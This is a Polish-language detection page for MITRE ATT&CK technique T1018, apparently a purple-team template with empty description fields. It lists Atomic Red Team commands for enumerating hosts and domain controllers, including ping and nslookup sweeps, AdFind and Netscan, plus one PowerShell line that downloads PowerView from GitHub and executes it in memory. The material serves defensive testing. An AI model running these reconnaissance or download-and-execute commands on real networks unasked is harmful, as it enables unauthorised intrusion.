# Alert: Remote System Discovery

Opis scenariusza, podatności lub techniki.

---

**Technika:** T1018  
**Nazwa:** Remote System Discovery  
**Taktyki:** Discovery  
**Status:** Pending  
**Autor:** Krzysztof K.  

---

<!--
Tactics: Discovery
Technique ID: T1018
Technique Name: Remote System Discovery
Status: Pending
--> 


---

## Atomic Red Team – dostępne testy dla tej techniki

### Remote System Discovery - net
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
net view /domain
net view
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1018\Remote_System_Discovery_-_net/test_1.cmd)

### Remote System Discovery - net group Domain Computers
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
net group "Domain Computers" /domain
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1018\Remote_System_Discovery_-_net_group_Doma/test_1.cmd)

### Remote System Discovery - nltest
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
nltest.exe /dclist:#{target_domain}
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1018\Remote_System_Discovery_-_nltest/test_1.cmd)

### Remote System Discovery - ping sweep
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
for /l %i in (#{start_host},1,#{stop_host}) do ping -n 1 -w 100 #{subnet}.%i
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1018\Remote_System_Discovery_-_ping_sweep/test_1.cmd)

### Remote System Discovery - arp
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
arp -a
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1018\Remote_System_Discovery_-_arp/test_1.cmd)

### Remote System Discovery - nslookup
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
$pieces = $localip.split(".")
$firstOctet = $pieces[0]
$secondOctet = $pieces[1]
$thirdOctet = $pieces[2]
foreach ($ip in 1..255 | % { "$firstOctet.$secondOctet.$thirdOctet.$_" } ) {cmd.exe /c nslookup $ip}
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1018\Remote_System_Discovery_-_nslookup/test_1.ps1)

### Remote System Discovery - adidnsdump
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
"#{venv_path}\Scripts\adidnsdump" -u #{user_name} -p #{acct_pass} --print-zones #{host_name}
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1018\Remote_System_Discovery_-_adidnsdump/test_1.cmd)

### Adfind - Enumerate Active Directory Computer Objects
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -f (objectcategory=computer) #{optional_args}
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1018\Adfind_-_Enumerate_Active_Directory_Comp/test_1.cmd)

### Adfind - Enumerate Active Directory Domain Controller Objects
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" #{optional_args} -sc dclist
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1018\Adfind_-_Enumerate_Active_Directory_Doma/test_1.cmd)

### Enumerate domain computers within Active Directory using DirectorySearcher
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher("(ObjectCategory=Computer)")
$DirectorySearcher.PropertiesToLoad.Add("Name")
$Computers = $DirectorySearcher.findall()
foreach ($Computer in $Computers) {
  $Computer = $Computer.Properties.name
  if (!$Computer) { Continue }
  Write-Host $Computer}
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1018\Enumerate_domain_computers_within_Active/test_1.ps1)

### Enumerate Active Directory Computers with Get-AdComputer
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
Get-AdComputer -Filter *
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1018\Enumerate_Active_Directory_Computers_wit/test_1.ps1)

### Enumerate Active Directory Computers with ADSISearcher
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
([adsisearcher]"objectcategory=computer").FindAll(); ([adsisearcher]"objectcategory=computer").FindOne()
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1018\Enumerate_Active_Directory_Computers_wit/test_1.ps1)

### Get-DomainController with PowerView
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1018\Get-DomainController_with_PowerView/test_1.ps1)

### Get-WmiObject to Enumerate Domain Controllers
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
try { get-wmiobject -class ds_computer -namespace root\directory\ldap -ErrorAction Stop }
catch { $_; exit $_.Exception.HResult }
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1018\Get-WmiObject_to_Enumerate_Domain_Contro/test_1.ps1)

### Remote System Discovery - net group Domain Controller
**Opis:** 

<b>Polecenia testowe (cmd):</b>
```
net group /domain "Domain controllers"
```
[Pobierz test_1.cmd](../../scenarios/atomic_tests\T1018\Remote_System_Discovery_-_net_group_Doma/test_1.cmd)

### Enumerate Remote Hosts with Netscan
**Opis:** 

<b>Polecenia testowe (powershell):</b>
```
cmd /c '#{netscan_path}' /hide /auto:"$env:temp\T1018NetscanOutput.txt" /range:'#{range_to_scan}'
```
[Pobierz test_1.ps1](../../scenarios/atomic_tests\T1018\Enumerate_Remote_Hosts_with_Netscan/test_1.ps1)

<b>Polecenia cleanup (powershell):</b>
```
remove-item "$env:temp\T1018NetscanOutput.txt" -force -erroraction silentlycontinue
```
[Pobierz cleanup_1.ps1](../../scenarios/atomic_tests\T1018\Enumerate_Remote_Hosts_with_Netscan/cleanup_1.ps1)

[Zobacz testy na GitHubie](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1018)
